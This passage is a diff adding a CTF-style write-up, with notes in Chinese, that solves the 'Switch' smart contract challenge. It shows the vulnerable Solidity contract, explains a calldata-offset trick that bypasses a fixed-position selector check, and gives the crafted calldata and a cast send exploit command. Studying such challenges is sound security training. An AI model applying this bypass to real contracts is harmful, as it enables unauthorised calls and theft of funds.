@@ -2538,3 +2538,79 @@ contract Hack {
     }
 }
 ```
+
+## 29. Switch
+
+Just have to flip the switch :)
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Switch {
+    bool public switchOn; // switch is off
+    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));
+
+     modifier onlyThis() {
+        require(msg.sender == address(this), "Only the contract can call this");
+        _;
+    }
+
+    modifier onlyOff() {
+        // we use a complex data type to put in memory
+        bytes32[1] memory selector;
+        // check that the calldata at position 68 (location of _data)
+        assembly {
+            calldatacopy(selector, 68, 4) // grab function selector from calldata
+        }
+        require(
+            selector[0] == offSelector,
+            "Can only call the turnOffSwitch function"
+        );
+        _;
+    }
+
+    function flipSwitch(bytes memory _data) public onlyOff {
+        (bool success, ) = address(this).call(_data);
+        require(success, "call failed :(");
+    }
+
+    function turnSwitchOn() public onlyThis {
+        switchOn = true;
+    }
+
+    function turnSwitchOff() public onlyThis {
+        switchOn = false;
+    }
+
+}
+```
+
+- 需要通过 `flipSwitch()` 调用 `turnSwitchOn()`，而 `onlyOff` 修饰符会检查 `calldata[68:52]` 字节是否为 `offSelector`
+- 正常情况下编码的 calldata 没办法绕过 `onlyOff` 的检查调用 `turnSwitchOn()`
+
+    flipSelector|_data offset|_data length|Selector
+    -|-|-|-
+    4 bytes|32 bytes|32 bytes|4 bytes
+
+- 不过可以尝试更改 `_data` 的偏移量，并将 `onSelector` 放在 `offSelector` 之后
+
+    flipSelector|_data offset|padding|offSelector|_data length|onSelector
+    -|-|-|-|-|-
+    4 bytes|32 bytes|32 bytes|32 bytes|32 bytes|4 bytes
+
+- 那么调用 `flipSwitch()` 传入的 `_data` 编码如下
+
+    ```bash
+    0000000000000000000000000000000000000000000000000000000000000060 # _data offset
+    0000000000000000000000000000000000000000000000000000000000000004
+    20606e1500000000000000000000000000000000000000000000000000000000 # offSelector
+    0000000000000000000000000000000000000000000000000000000000000004
+    76227e1200000000000000000000000000000000000000000000000000000000
+    ```
+
+### Exploit
+
+```bash
+$ cast send <contract-address> --private-key <key> --rpc-url <rpc-url> 0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000 
+```
